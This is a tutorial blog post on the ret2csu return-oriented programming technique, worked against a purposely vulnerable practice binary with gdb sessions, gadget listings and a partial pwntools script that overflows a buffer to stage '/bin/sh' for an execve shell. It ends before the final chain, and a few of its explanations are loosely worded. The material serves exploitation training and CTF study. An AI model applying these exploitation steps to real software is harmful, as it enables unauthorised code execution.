---
layout:     post
title:      "ret2csu - A Return Oriented Programming Technique"
date:       2020-04-13
author:    "D4mianWayne"
img: "/img/pwned.png"
tags:    ["rop, bof, ret2csu, ctf"]
categories: ["Pwning"]
layout: "simple"

---



This is an in-depth guide on `ret2csu` technique. I tried to make this article as much detailed as I could, including references and some binary to practice it with.

<!-- more -->


# What is ret2csu?

Well, as you already know this a sub-technique of Return Oriented Programming. As you already know that Return Oriented Programming is the technique of using the available gadgets from the binary to craft a payload. The `ret2csu` technique involves the utilization of the gadgets present in `__libc_csu_init` to fill in the gaps of unavailable gadgets. For example, what if we want to do an `execve` syscall, we would need a `rdi` to pass `/bin/sh`, `rsi` for passing `0` and same for `rdx` and while looking for gadgets in binary, we didn't  find any `pop rdx; ret;`, then we use gadgets from `__libc_csu_init` to craft a chain carefully which will load the contents we gave to the `rdx`.

Confused? Don't worry, I'm gonna explain it in a very detailed way :)

# Prerequisites

This is included because, what if you're trying to understand it as a beginner, I included this section because this will help you recall the knowledge you need for performing a `ret2csu` attack. This includes the calling convention of `x86_64` bit binary and the assembly instructions we will deal with.

### Calling convetion

Calling convention refers to the way arguments are passed to a function, like how is the workflow of functions work at low level. Let's take an example program:-

```C
#include<stdio.h>

int main()
{
    int x = 1;
    char *s = "Hello World"; // :p
    float y = 0.12;
    printf("String: %s\nInteger: %d\nFloat: %f\n", s, x, y);
    return 0;
}
```

Let's compile it:-

```asm
 ✘ d4mianwayne@oracle: /tmp $ cat sample.c
#include<stdio.h>

int main()
{
    int x = 1;
    char *s = "Hello World"; // :p
    double y = 100;
    printf("String: %s\nInteger: %d\Double: %lf\n", s, x, y);
    return 0;
}

 d4mianwayne@oracle: /tmp $ gcc sample.c -o sample
 d4mianwayne@oracle: /tmp $ ./sample 
String: Hello World
Integer: 1
Float: 100.000000
```

It works perfectly as it's supposed to Let's start gdb and start analyzing the binary workflow:-

```asm
 d4mianwayne@oracle: /tmp $ gdb-gef -q sample     
Reading symbols from sample...(no debugging symbols found)...done.
GEF for linux ready, type `gef' to start, `gef config' to configure
78 commands loaded for GDB 8.1.0.20180409-git using Python engine 3.6
[*] 2 commands could not be loaded, run `gef missing` to know why.
gef➤  disas main
Dump of assembler code for function main:
   0x000000000000064a <+0>:	push   rbp
   0x000000000000064b <+1>:	mov    rbp,rsp
   0x000000000000064e <+4>:	sub    rsp,0x30
   0x0000000000000652 <+8>:	mov    DWORD PTR [rbp-0x14],0x1
   0x0000000000000659 <+15>:	lea    rax,[rip+0xc8]        # 0x728
   0x0000000000000660 <+22>:	mov    QWORD PTR [rbp-0x10],rax
   0x0000000000000664 <+26>:	movsd  xmm0,QWORD PTR [rip+0xf4]        # 0x760
   0x000000000000066c <+34>:	movsd  QWORD PTR [rbp-0x8],xmm0
   0x0000000000000671 <+39>:	mov    rcx,QWORD PTR [rbp-0x8]
   0x0000000000000675 <+43>:	mov    edx,DWORD PTR [rbp-0x14]
   0x0000000000000678 <+46>:	mov    rax,QWORD PTR [rbp-0x10]
   0x000000000000067c <+50>:	mov    QWORD PTR [rbp-0x28],rcx
   0x0000000000000680 <+54>:	movsd  xmm0,QWORD PTR [rbp-0x28]
   0x0000000000000685 <+59>:	mov    rsi,rax
   0x0000000000000688 <+62>:	lea    rdi,[rip+0xa9]        # 0x738
   0x000000000000068f <+69>:	mov    eax,0x1
   0x0000000000000694 <+74>:	call   0x520 <printf@plt>
   0x0000000000000699 <+79>:	mov    eax,0x0
   0x000000000000069e <+84>:	leave  
   0x000000000000069f <+85>:	ret    
End of assembler dump.
gef➤  
```

The `mov` lines are moving the variables from base pointers to registers. This is the basic instruction to move an address/value to other address/register.

> The line `0x000000000000064b <+1>:	mov    rbp,rsp`, this one moves the stack to the base pointer, this is because that way the program can easily retrieve the variables from the base pointer as they're stored at specific offsets.

Now, let's setup a breakpoint at `call printf` so that we can analyse how the arguments are being passed to it. GDB time:-

```asm
gef➤  b *main + 74
Breakpoint 1 at 0x694
```

The breakpoint has been set, now let's run the program and analyze:-

```asm
gef➤  r
Starting program: /tmp/sample 
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x1               
$rbx   : 0x0               
$rcx   : 0x4059000000000000
$rdx   : 0x1               
$rsp   : 0x00007fffffffde50  →  0x00007ffff7de59a0  →  <_dl_fini+0> push rbp
$rbp   : 0x00007fffffffde80  →  0x00005555555546a0  →  <__libc_csu_init+0> push r15
$rsi   : 0x0000555555554728  →  "Hello World"
$rdi   : 0x0000555555554738  →  "String: %s\nInteger: %d\nDouble: %lf\n"
$rip   : 0x0000555555554694  →  <main+74> call 0x555555554520 <printf@plt>
$r8    : 0x00007ffff7dd0d80  →  0x0000000000000000
$r9    : 0x00007ffff7dd0d80  →  0x0000000000000000
$r10   : 0x2               
$r11   : 0x3               
$r12   : 0x0000555555554540  →  <_start+0> xor ebp, ebp
$r13   : 0x00007fffffffdf60  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]


-- snip --

gef➤  info registers
rax            0x1	0x1
rbx            0x0	0x0
rcx            0x4059000000000000	0x4059000000000000
rdx            0x1	0x1
rsi            0x555555554728	0x555555554728
rdi            0x555555554738	0x555555554738
rbp            0x7fffffffde80	0x7fffffffde80
rsp            0x7fffffffde50	0x7fffffffde50
r8             0x7ffff7dd0d80	0x7ffff7dd0d80
r9             0x7ffff7dd0d80	0x7ffff7dd0d80
r10            0x2	0x2
r11            0x3	0x3
r12            0x555555554540	0x555555554540
r13            0x7fffffffdf60	0x7fffffffdf60
r14            0x0	0x0
r15            0x0	0x0
rip            0x555555554694	0x555555554694 <main+74>
eflags         0x206	[ PF IF ]
cs             0x33	0x33
ss             0x2b	0x2b
ds             0x0	0x0
es             0x0	0x0
fs             0x0	0x0
gs             0x0	0x0
```

Thanks to `gdb-gef`, we already know most of the things which we needed to know i.e. which register holds what value, but as we looking for the registers and we need to know what is happening since this is required for further learning.

Using `gdb`'s `x` command to analyze the memory and registers, we can see the following:-

```asm
gef➤  x/s $rdi
0x555555554738:	"String: %s\nInteger: %d\nDouble: %lf\n"
gef➤  x/s $rsi
0x555555554728:	"Hello World"
gef➤  x/s $rdx
0x1:	<error: Cannot access memory at address 0x1>
gef➤  x/s $rcx
0x4059000000000000:	<error: Cannot access memory at address 0x4059000000000000>
gef➤  x/f $rcx
0x4059000000000000:	Cannot access memory at address 0x4059000000000000
gef➤  
```

Breaking it down:-

* `x555555554738:	"String: %s\nInteger: %d\nDouble: %lf\n"` : This is in register `rdi` which is passed as 1st argument to the `printf`.
* `0x555555554728:	"Hello World"` : This is in register `rsi` which is passed as 2nd argument to `printf`.
* `0x1:	<error: Cannot access memory at address 0x1>` : First, we got a **Cannot access memory** i.e. the `integer` which we printed has a value of `0x01`, hence a memory access error. This is passed to `rdx` register which is the 3rd argument to the `printf`.
* `0x4059000000000000:	Cannot access memory at address 0x4059000000000000` : Again, that happened because the value doesn't point to a valid address. This is the 4th argument which is passed to `printf`.

> You might be wondering why we got a value like `0x4059000000000000` while we assigned `100` to the variable. That happened because the `x/f` printed an aligned value which doesn't print the double values normally. For checking double values we do `gef➤  p/f $rcx - $1 = 100`.

From this we know how calling conventions works:-

* 1st argument goes to `rdi`.
* 2nd argument goest to `rsi`.
* 3rd argument goes to `rdx`
* 4th argument goes to `rcx`.

> This is constant for every function in 64 bit calling convention on Linux System.

### Assembly Instructions

Since we understood the calling conventions, it's time to take a look at the assembly instructions we will deal with to understand the workflow of the payload. As an example, let's take the exact same binary and analyse it's `__libc_csu_init`, starting with `gdb` again:-

```asm
gef➤  disas __libc_csu_init
Dump of assembler code for function __libc_csu_init:
   0x00000000000006a0 <+0>:	push   r15
   0x00000000000006a2 <+2>:	push   r14
   0x00000000000006a4 <+4>:	mov    r15,rdx
   0x00000000000006a7 <+7>:	push   r13
   0x00000000000006a9 <+9>:	push   r12
   0x00000000000006ab <+11>:	lea    r12,[rip+0x200706]        # 0x200db8
   0x00000000000006b2 <+18>:	push   rbp
   0x00000000000006b3 <+19>:	lea    rbp,[rip+0x200706]        # 0x200dc0
   0x00000000000006ba <+26>:	push   rbx
   0x00000000000006bb <+27>:	mov    r13d,edi
   0x00000000000006be <+30>:	mov    r14,rsi
   0x00000000000006c1 <+33>:	sub    rbp,r12
   0x00000000000006c4 <+36>:	sub    rsp,0x8
   0x00000000000006c8 <+40>:	sar    rbp,0x3
   0x00000000000006cc <+44>:	call   0x4f0 <_init>
   0x00000000000006d1 <+49>:	test   rbp,rbp
   0x00000000000006d4 <+52>:	je     0x6f6 <__libc_csu_init+86>
   0x00000000000006d6 <+54>:	xor    ebx,ebx
   0x00000000000006d8 <+56>:	nop    DWORD PTR [rax+rax*1+0x0]
   0x00000000000006e0 <+64>:	mov    rdx,r15
   0x00000000000006e3 <+67>:	mov    rsi,r14
   0x00000000000006e6 <+70>:	mov    edi,r13d
   0x00000000000006e9 <+73>:	call   QWORD PTR [r12+rbx*8]
   0x00000000000006ed <+77>:	add    rbx,0x1
   0x00000000000006f1 <+81>:	cmp    rbp,rbx
   0x00000000000006f4 <+84>:	jne    0x6e0 <__libc_csu_init+64>
   0x00000000000006f6 <+86>:	add    rsp,0x8
   0x00000000000006fa <+90>:	pop    rbx
   0x00000000000006fb <+91>:	pop    rbp
   0x00000000000006fc <+92>:	pop    r12
   0x00000000000006fe <+94>:	pop    r13
   0x0000000000000700 <+96>:	pop    r14
   0x0000000000000702 <+98>:	pop    r15
   0x0000000000000704 <+100>:	ret    
```

Now, we see quite a lot of instructions, I'll explain it in one line since they're easy enough to get. 
> Note: I will only explain the instruction which we will need to understand.

* `lea` : This instruction **load effective address** to a register.
* `mov` : This instruction is used to move an address/value to a register.
* `je` : This is a conditional instruction which means **jump if equals to** executes depending on the result of previous instruction.
* `jle`: This is also a conditional instruction which means **jump if less than or equal to** depending on the result of previous instruction.
* `call` : This instruction calls a subroutine.
* `cmp` : This compares register with a register or a register with a value.
* `add` : This adds the value given at right operand to left operand and store in it.
* `pop` : This pop the register which is given as an operand and wait for a value/address to be given.
* `ret` : This shows that a subroutine or instruction has been completed.


# Pwning time


---

#### Attachments:-

Binary: [chall](/files/binary/chall)


Source File: [chall.c](/files/sources/chall.c)


Exploit: [xpl.py](/files/exploits/xpl_ret2csu.py)

---

Now, since we are way past the required knowledge section, it's time to understand stuff practically since Pwning is best explained practically. Let's take a piece of **vulnerable code** and compile it.

```C
#include <stdio.h>
#include <stdlib.h>


void vulnerable()
{
	char buf[30];
	gets(buf);          /* Well, duh? :p */
 }

int main()
{
 char name[20];
 puts("Welcome to the world of Pwning");
 puts("I'd like to know the name of brave warrior");
 fgets(name, 20, stdin);
 puts("As a token of appreciation, how about pwning me?");
 vulnerable();
 return 0;
}
```

Let's compile it by disabling the stack canary and PIE to make it more understandable. Using `gcc --no-stack-protector -no-pie chall.c -o chall`:-

```bash
 d4mianwayne@oracle: /tmp/ctf/pwn1 $ gcc --no-stack-protector -no-pie chall.c -o chall
chall.c: In function ‘vulnerable’:
chall.c:7:2: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration]
  gets(buf);          /* Well, duh? :p */
  ^~~~
  fgets
/tmp/ccr4ksWU.o: In function `vulnerable':
chall.c:(.text+0x15): warning: the `gets` function is dangerous and should not be used.
 d4mianwayne@oracle: /tmp/ctf/pwn1 $ ./chall
Welcome to the world of Pwning
I'd like to know the name of brave warrior
Robin
As a token of appreciation, how about pwning me?
Hello World
```
It works as it is supposed to, right?. But, our end goal is to get a shell or do something it is not supposed to. Let's fire up gdb and see what we have and start analyzing the binary :-

```asm
Reading symbols from chall...(no debugging symbols found)...done.
GEF for linux ready, type `gef' to start, `gef config' to configure
78 commands loaded for GDB 8.1.0.20180409-git using Python engine 3.6
[*] 2 commands could not be loaded, run `gef missing` to know why.
gef➤  info functions 
All defined functions:

Non-debugging symbols:
0x0000000000400470  _init
0x00000000004004a0  puts@plt
0x00000000004004b0  fgets@plt
0x00000000004004c0  gets@plt
0x00000000004004d0  _start
0x0000000000400500  _dl_relocate_static_pie
0x0000000000400510  deregister_tm_clones
0x0000000000400540  register_tm_clones
0x0000000000400580  __do_global_dtors_aux
0x00000000004005b0  frame_dummy
0x00000000004005b7  vulnerable
0x00000000004005d3  main
0x0000000000400630  __libc_csu_init
0x00000000004006a0  __libc_csu_fini
0x00000000004006a4  _fini
gef➤  disas vulnerable 
Dump of assembler code for function vulnerable:
   0x00000000004005b7 <+0>:	push   rbp
   0x00000000004005b8 <+1>:	mov    rbp,rsp
   0x00000000004005bb <+4>:	sub    rsp,0x20
   0x00000000004005bf <+8>:	lea    rax,[rbp-0x20]
   0x00000000004005c3 <+12>:	mov    rdi,rax
   0x00000000004005c6 <+15>:	mov    eax,0x0
   0x00000000004005cb <+20>:	call   0x4004c0 <gets@plt>
   0x00000000004005d0 <+25>:	nop
   0x00000000004005d1 <+26>:	leave  
   0x00000000004005d2 <+27>:	ret    
End of assembler dump.
```

As we have access to the source code, we pretty much know what exactly is going on. We need to find a way to get a shell and the `checksec` shows us we have a non-executable stack and `Partial Relro` which means GOT is overwritable but that's not the scope of this article, so we will keep it out.

---
> We are going to perform `ret2libc` but this time instead of doing `system("/bin/sh")` we are going to do `execve("/bin/sh", 0, 0)`
---

Let's run `ropper` and see what gadgets we can control:-

```asm
 d4mianwayne@oracle: /tmp/ctf/pwn1 $ ropper --file chall --search 'pop'
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop

[INFO] File: chall
0x000000000040068c: pop r12; pop r13; pop r14; pop r15; ret; 
0x000000000040068e: pop r13; pop r14; pop r15; ret; 
0x0000000000400690: pop r14; pop r15; ret; 
0x0000000000400692: pop r15; ret; 
0x00000000004005db: pop rax; ret; 
0x000000000040052b: pop rbp; mov edi, 0x601040; jmp rax; 
0x000000000040068b: pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
0x000000000040068f: pop rbp; pop r14; pop r15; ret; 
0x0000000000400538: pop rbp; ret; 
0x0000000000400693: pop rdi; ret; 
0x0000000000400691: pop rsi; pop r15; ret; 
0x000000000040068d: pop rsp; pop r13; pop r14; pop r15; ret; 
```

We have access to `rdi`, `rsi` but **wait** we don't have `rdx`, (only if I added a `pop rdx; ret` instruction as well), that's where `ret2csu` comes in. We have access to plenty of other registers like `r12`, `r13`, `r14` and `r15` which if you thought is useless, you gonna check the hidden power and access they have. Since `ret2csu` deals with `__libc_csu_init`, why don't we check it's code and know about that function itself? Let's get started:-

Checking the disassembly of the `__libc_csu_init__` from the challenge binary:-

```asm
gef➤  disas __libc_csu_init
Dump of assembler code for function __libc_csu_init:
   0x0000000000400630 <+0>:	push   r15
   0x0000000000400632 <+2>:	push   r14
   0x0000000000400634 <+4>:	mov    r15,rdx
   0x0000000000400637 <+7>:	push   r13
   0x0000000000400639 <+9>:	push   r12
   0x000000000040063b <+11>:	lea    r12,[rip+0x2007ce]        # 0x600e10
   0x0000000000400642 <+18>:	push   rbp
   0x0000000000400643 <+19>:	lea    rbp,[rip+0x2007ce]        # 0x600e18
   0x000000000040064a <+26>:	push   rbx
   0x000000000040064b <+27>:	mov    r13d,edi
   0x000000000040064e <+30>:	mov    r14,rsi
   0x0000000000400651 <+33>:	sub    rbp,r12
   0x0000000000400654 <+36>:	sub    rsp,0x8
   0x0000000000400658 <+40>:	sar    rbp,0x3
   0x000000000040065c <+44>:	call   0x400470 <_init>
   0x0000000000400661 <+49>:	test   rbp,rbp
   0x0000000000400664 <+52>:	je     0x400686 <__libc_csu_init+86>
   0x0000000000400666 <+54>:	xor    ebx,ebx
   0x0000000000400668 <+56>:	nop    DWORD PTR [rax+rax*1+0x0]
   0x0000000000400670 <+64>:	mov    rdx,r15
   0x0000000000400673 <+67>:	mov    rsi,r14
   0x0000000000400676 <+70>:	mov    edi,r13d
   0x0000000000400679 <+73>:	call   QWORD PTR [r12+rbx*8]
   0x000000000040067d <+77>:	add    rbx,0x1
   0x0000000000400681 <+81>:	cmp    rbp,rbx
   0x0000000000400684 <+84>:	jne    0x400670 <__libc_csu_init+64>
   0x0000000000400686 <+86>:	add    rsp,0x8
   0x000000000040068a <+90>:	pop    rbx
   0x000000000040068b <+91>:	pop    rbp
   0x000000000040068c <+92>:	pop    r12
   0x000000000040068e <+94>:	pop    r13
   0x0000000000400690 <+96>:	pop    r14
   0x0000000000400692 <+98>:	pop    r15
   0x0000000000400694 <+100>:	ret    
End of assembler dump.
```

It is not that long, so we can get this in a minute or two completely, though there's no point in understanding th whole workflow of the function so I'm going to take a look  over the instructions which will be useful.
Now, as you see the following lines:-

```asm
   0x0000000000400670 <+64>:	mov    rdx,r15
   0x0000000000400673 <+67>:	mov    rsi,r14
   0x0000000000400676 <+70>:	mov    edi,r13d
```

This seems interesting, the contents of `r13`, `r14` and `r15` are going in `edi`, `rsi` and `rdx` respectively. Remember, we had access to `r15` but not to `rdx` and the instruction at `__libc_csu_init + 64` can move the content of `r15` to `rdx`, that is the one we were looking for. But before start using these gadgets we need to understand what exactly is `__libc_csu_init` and it's usage.


---

### __libc_csu_init

The `__libc_csu_init` is found in every binary, the purpose of this function is for initialization of functions and variables such that our binary is ready to use. From the libc source code, we can see:-

```C
int __libc_csu_init(int argc, char **argv, char **envp)
{
    /*
     * Call all the __attribute__((constructor)) functions.
     * These symbols are generated by the linker.
     */
    size_t num_init = __init_array_end - __init_array_start; 
    for (size_t i = 0; i < num_init; i++) {
        __init_array_start[i](argc, argv, envp);
    }
}
```

In a nutshell, it calculates the difference between the `__init_array`'s start and end address which contains the functions, constructors, destructors, objects etc. which called at the time of initialization and hence, initialize them accordingly. I'm not covering much since the **journey of how main is called from a binary** would take it's own post, for now this is the knowledge we need.

---

Now, let's break down the process of creating an exploit and cover it one by one. Let's get started:-

### Finding offset to RIP

As usual, we need to know that exact how much bytes we need to give to the input in order to get the control of instruction pointer. Since we already used `gets`, we know that this program is vulnerable to buffer overflow, time to use `gdb-gef`'s `pattern` which will help us.

```asm
gef➤  pattern create 200
[+] Generating a pattern of 200 bytes
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
[+] Saved as '$_gef0'
gef➤  r
Starting program: /tmp/ctf/pwn1/chall 
Welcome to the world of Pwning
I'd like to know the name of brave warrior
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
As a token of appreciation, how about pwning me?

Program received signal SIGSEGV, Segmentation fault.
[ Legend: Modified register | Code | Heap | Stack | String ]

──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall", stopped 0x4005d4 in vulnerable (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4005d4 → vulnerable()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x00000000004005d4 in vulnerable ()
gef➤  x/xg $rsp
0x7fffffffde38:	0x6161616161616166
gef➤  pattern search 0x6161616161616166
[+] Searching '0x6161616161616166'
[+] Found at offset 40 (little-endian search) likely
[+] Found at offset 33 (big-endian search) 
gef➤  
```

Now, since we control over the RIP, time to use a `.bss` address to read string `/bin/sh` which we will be passed to first argument of `execve` later on.

### Storing `/bin/sh` at a `.bss` address

Since, we want to do `execve("/bin/sh", 0, 0)` but we don't have any memory which already have `/bin/sh` address, so what we gonna do is pick an address from `.bss` section and store the string at that particular address. Now, let's make a `pwntools` script to interact with binary and work with it, but firstly let's pick a `.bss` address with the help of `gdb`.

```asm
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /tmp/ctf/pwn1/chall
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /tmp/ctf/pwn1/chall
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /tmp/ctf/pwn1/chall # I randomly picked an address from this range.
gef➤  r
Starting program: /tmp/ctf/pwn1/chall 
Welcome to the world of Pwning
I'd like to know the name of brave warrior
hello
As a token of appreciation, how about pwning me?
^C
Program received signal SIGINT, Interrupt.
[ Legend: Modified register | Code | Heap | Stack | String ]
```
Now, since we know that this binary contains a `rw-` data section, we will use it to store the `/bin/sh` at it. Let's start interacting with binary and send payload:-

```py
from pwn import *

elf = ELF("chall")
p = process("./chall")

payload = b"A"*40 # Offset to RIP
payload += p64(0x0400693) # `pop rdi; ret`
payload += p64(0x601150) # the `.bss` address`
payload += p64(elf.plt['gets']) # PLT address of `gets`
p.sendlineafter(b"warrior\n", "Robin")
pause() # This will allow the process to pause and then we debug it in `gdb`
p.sendlineafter(b"me?\n", payload) 
p.interactive()
```

> Payload: The `pop rdi; ret` will pop the `rdi` register and we gave the `.bss` address right after it, after that we added the PLT address of `gets`, that means we are just doing `gets(write_addr)`.

Let's run this script, after that we will attach it to `gdb` and check if the `/bin/sh` has been stored at that `.bss` address or not:-

```asm
 ✘ d4mianwayne@oracle : /tmp/ctf/pwn1 $ python3 xpl.py
[*] '/tmp/ctf/pwn1/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './chall': pid 23064
[*] Paused (press any to continue)
```

Let's `attach` this process to `gdb`:-

```asm
gef➤  attach 23064
Attaching to program: /tmp/ctf/pwn1/chall, process 23064
Reading symbols from /lib/x86_64-linux-gnu/libc.so.6...Reading symbols from /usr/lib/debug//lib/x86_64-linux-gnu/libc-2.27.so...done.


-- snip -- 

[#3] 0x7fb09f4e21fd → _IO_gets(buf=0x7ffdd9adead0 "")
[#4] 0x4005d2 → vulnerable()
[#5] 0x400623 → main()
──────────────────────────────────────────────────────────────────────────────────────────────────────────
0x00007fb09f572081 in __GI___libc_read (fd=0x0, buf=0xca4670, nbytes=0x1000) at ../sysdeps/unix/sysv/linux/read.c:27
27	../sysdeps/unix/sysv/linux/read.c: No such file or directory.
```

Continuing the process, let's enter the `/bin/sh` string:-

```asm
[*] Switching to interactive mode
$ /bin/sh
```

Well, back to `gdb`:-

```asm
gef➤  
gef➤  c
Continuing.

Thread 1 "chall" received signal SIGSEGV, Segmentation fault.
[ Legend: Modified register | Code | Heap | Stack | String ]


-- snip -- 

───────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall", stopped 0x7ffdd9adec00 in ?? (), reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7ffdd9adec00 → add DWORD PTR [rax], eax
──────────────────────────────────────────────────────────────────────────────────────────────────────────
0x00007ffdd9adec00 in ?? ()
gef➤  x/s 0x601150
0x601150:	"/bin/sh"
```

Great, we stored the string `"/bin/sh"` at the `0x601150`.
### The `ret2csu` technique

We are finally at the main part of this blog post, this is where I will explain the technique very thoroughly, so be sure to pay attention. But, it is time for some code analysis of the gadgets we are going to use:-

```asm
gef➤  disas __libc_csu_init
Dump of assembler code for function __libc_csu_init:
   
   -- snip -- 

   0x0000000000400670 <+64>:	mov    rdx,r15
   0x0000000000400673 <+67>:	mov    rsi,r14
   0x0000000000400676 <+70>:	mov    edi,r13d
   0x0000000000400679 <+73>:	call   QWORD PTR [r12+rbx*8]
   0x000000000040067d <+77>:	add    rbx,0x1
   0x0000000000400681 <+81>:	cmp    rbp,rbx
   0x0000000000400684 <+84>:	jne    0x400670 <__libc_csu_init+64>
   0x0000000000400686 <+86>:	add    rsp,0x8
   0x000000000040068a <+90>:	pop    rbx
   0x000000000040068b <+91>:	pop    rbp
   0x000000000040068c <+92>:	pop    r12
   0x000000000040068e <+94>:	pop    r13
   0x0000000000400690 <+96>:	pop    r14
   0x0000000000400692 <+98>:	pop    r15
   0x0000000000400694 <+100>:	ret    
End of assembler dump.
```

These are the instructions we are going to use, we have to break these gadgets in two parts so that we first fill up the registers like `r12`, `r13` and others and after that the `mov` instructions will move the contents to the register we want it to. Let's break the gadgets in **2** parts:-

```asm
   0x000000000040068a <+90>:	pop    rbx
   0x000000000040068b <+91>:	pop    rbp
   0x000000000040068c <+92>:	pop    r12
   0x000000000040068e <+94>:	pop    r13
   0x0000000000400690 <+96>:	pop    r14
   0x0000000000400692 <+98>:	pop    r15
   0x0000000000400694 <+100>:	ret   
```

This would be the first gadgets, first let's work on using these and we will move to the other gadgets:-

Since, `r15`'s content is going in `rdx`, `r14`'s content is going to `rsi` and `r13d`'s content is going to `rdi`. This means, we have to set the contents of these registers to `/bin/sh`, `0` and `0` respectively. Let's work on:-

> Note: The `d` in `r13d` means the `dword`.

The second ROP gadget:-

```asm

   0x0000000000400670 <+64>:	mov    rdx,r15
   0x0000000000400673 <+67>:	mov    rsi,r14
   0x0000000000400676 <+70>:	mov    edi,r13d
   0x0000000000400679 <+73>:	call   QWORD PTR [r12+rbx*8]
   0x000000000040067d <+77>:	add    rbx,0x1
   0x0000000000400681 <+81>:	cmp    rbp,rbx
   0x0000000000400684 <+84>:	jne    0x400670 <__libc_csu_init+64>
   0x0000000000400686 <+86>:	add    rsp,0x8
   0x000000000040068a <+90>:	pop    rbx
   0x000000000040068b <+91>:	pop    rbp
   0x000000000040068c <+92>:	pop    r12
   0x000000000040068e <+94>:	pop    r13
   0x0000000000400690 <+96>:	pop    r14
   0x0000000000400692 <+98>:	pop    r15
   0x0000000000400694 <+100>:	ret   
```

For the second part, the one which will transfer the contents of `r15`, `r14` and `r13` to `rdx`, `r14` to `rsi` and `r13` to `edi`. But there are some problems, the instructions after those `mov` instructions need to be handled carefully such that if any one of the values in register,  if wrong, would just discard everything. So, this is the important part, so focus on the explaination and work carefully.

Let's see how we will handle it, line by line:-

##### `call   QWORD PTR [r12+rbx*8]` 

This instruction calls a subroutine, now for this we may have to give up something which points to a function which is present in the binary and do not reference to an invalid address. To handle this, we will provide an address from Dynamic section of ELF such that the calling that function won't do any change to the register content, as it should preserve the state of these registers, it also should not point to any an arbitrary address which will cause a breakthrough in the binary workflow. To meet this requirements, we will need either a `_init` or `_fini` to preserve the state of register:-

```asm
gef➤  x/5xg &_DYNAMIC
0x600e20:	0x0000000000000001	0x0000000000000001
0x600e30:	0x000000000000000c	0x0000000000400470
0x600e40:	0x000000000000000d
gef➤  x/xg 0x600e30
0x600e30:	0x000000000000000c
gef➤  x/xg 0x600e34
0x600e34:	0x0040047000000000
gef➤  x/xg 0x600e38
0x600e38:	0x0000000000400470
gef➤  disas 0x0000000000400470
Dump of assembler code for function _init:
   0x0000000000400470 <+0>:	sub    rsp,0x8
   0x0000000000400474 <+4>:	mov    rax,QWORD PTR [rip+0x200b7d]        # 0x600ff8
   0x000000000040047b <+11>:	test   rax,rax
   0x000000000040047e <+14>:	je     0x400482 <_init+18>
   0x0000000000400480 <+16>:	call   rax
   0x0000000000400482 <+18>:	add    rsp,0x8
   0x0000000000400486 <+22>:	ret    
End of assembler dump.
gef➤  

```

##### `0x000000000040067d <+77>:	add    rbx,0x1`

This will increment the value of value of `rbx` by `1`.

##### `0x0000000000400681 <+81>:	cmp    rbp,rbx`

This will compare the value of `rbp` with `rbx`.

##### `0x0000000000400684 <+84>:	jne    0x400670 <__libc_csu_init+64>`

This is a conditional jump, if the value of the `cmp rbp, rbx` is not equal, this means it'll jump to the instruction stored at `__libc_csu_init + 64`.

##### `0x0000000000400686 <+86>:	add    rsp,0x8`

This will add the `0x8` bytes and increase the size of the `rsp` by it.

### The ROP Chain: Explanation
Now, let's see exactly what is happening with the chain:-

```asm
   0x0000000000400670 <+64>:	mov    rdx,r15
   0x0000000000400673 <+67>:	mov    rsi,r14
   0x0000000000400676 <+70>:	mov    edi,r13d
   0x0000000000400679 <+73>:	call   QWORD PTR [r12+rbx*8]
   0x000000000040067d <+77>:	add    rbx,0x1
   0x0000000000400681 <+81>:	cmp    rbp,rbx
   0x0000000000400684 <+84>:	jne    0x400670 <__libc_csu_init+64>
   0x0000000000400686 <+86>:	add    rsp,0x8
   0x000000000040068a <+90>:	pop    rbx
   0x000000000040068b <+91>:	pop    rbp
   0x000000000040068c <+92>:	pop    r12
   0x000000000040068e <+94>:	pop    r13
   0x0000000000400690 <+96>:	pop    r14
   0x0000000000400692 <+98>:	pop    r15
   0x0000000000400694 <+100>:	ret  
```

Firstly, the lines with `mov` instruction are transferring the values of the registers of left operand to right operand. Then the `call` keyword is calling the subroutine calculated by at offset `r12 + rbx * 8`, and with the square brackets around them means the indirect addressing, this will make the `call` instruction to jump at that subroutine at the given address. Now, the `add rbx, 1` will increment the value of `rbx` by `1`. Then the value of `rbp` and `rbx` is compared, if they are not equal the RIP will be set to  `__libc_csu_init + 64`. If it is equal, then the stack size will be increased by 8 and the registers `rbx`, `rbp`, `r13`, `r14` and `r14` will be popped.

---

# Payload: Part 1

